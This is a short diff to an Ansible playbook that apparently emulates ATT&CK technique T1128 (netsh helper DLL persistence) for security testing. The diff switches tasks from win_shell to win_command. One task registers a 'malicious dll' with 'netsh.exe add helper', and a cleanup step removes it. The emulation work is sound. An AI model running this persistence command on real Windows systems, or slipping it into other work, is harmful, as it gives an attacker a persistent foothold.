@@ -12,7 +12,7 @@
         msg="Playbook Completed#T1128#failed#win#"
       when: command_result.rc == 1
     - name: execute malicious dll
-      win_shell: |
+      win_command: |
         cd c:\temp
         netsh.exe add helper {{ cnc_dll }}
       ignore_errors: yes
@@ -30,7 +30,7 @@
       debug: msg="Playbook Completed#T1128#passed#win#" 
       when: T1128.stat.exists
     - name: cleanup
-      win_shell: |
+      win_command: |
         del C:\temp\{{ cnc_dll }}
         del C:\temp\evil.txt
         netsh.exe del helper {{ cnc_dll }}
